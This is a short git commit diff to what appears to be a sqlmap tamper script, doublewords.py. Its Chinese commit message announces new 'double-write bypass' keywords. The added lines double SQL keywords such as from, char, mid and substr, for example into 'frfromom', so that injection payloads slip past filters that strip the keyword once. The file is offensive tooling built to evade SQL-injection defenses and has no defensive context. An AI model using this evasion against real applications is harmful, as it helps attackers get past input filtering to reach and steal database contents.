2752fe1536069a63e31f4a7681f745874cb4d5bf
interstin <484048373@qq.com>
2024-04-15 14:19:11 +0800

    新增双写绕过脚本关键字

--- doublewords.py
+++ doublewords.py
@@ -17,10 +17,14 @@ def tamper(payload, **kwargs):
     payload= re.sub('by' , 'bbyy',payload,flags=re.IGNORECASE)
     payload= re.sub('if' , 'iiff',payload,flags=re.IGNORECASE)
     payload= re.sub('and' , 'anandd',payload,flags=re.IGNORECASE)
+    payload= re.sub('mid' , 'mimidd',payload,flags=re.IGNORECASE)
+    payload= re.sub('char' , 'chcharar',payload,flags=re.IGNORECASE)
+    payload= re.sub('from' , 'frfromom',payload,flags=re.IGNORECASE)
     payload= re.sub('union' , 'uniunionon',payload,flags=re.IGNORECASE)
     payload= re.sub('sleep' , 'slesleepep',payload,flags=re.IGNORECASE)
     payload= re.sub('where' , 'whewherere',payload,flags=re.IGNORECASE)
     payload= re.sub('select' , 'selselectect',payload,flags=re.IGNORECASE)
+    payload= re.sub('substr' , 'subsubstrstr',payload,flags=re.IGNORECASE)
     retVal=payload
     return retVal
  
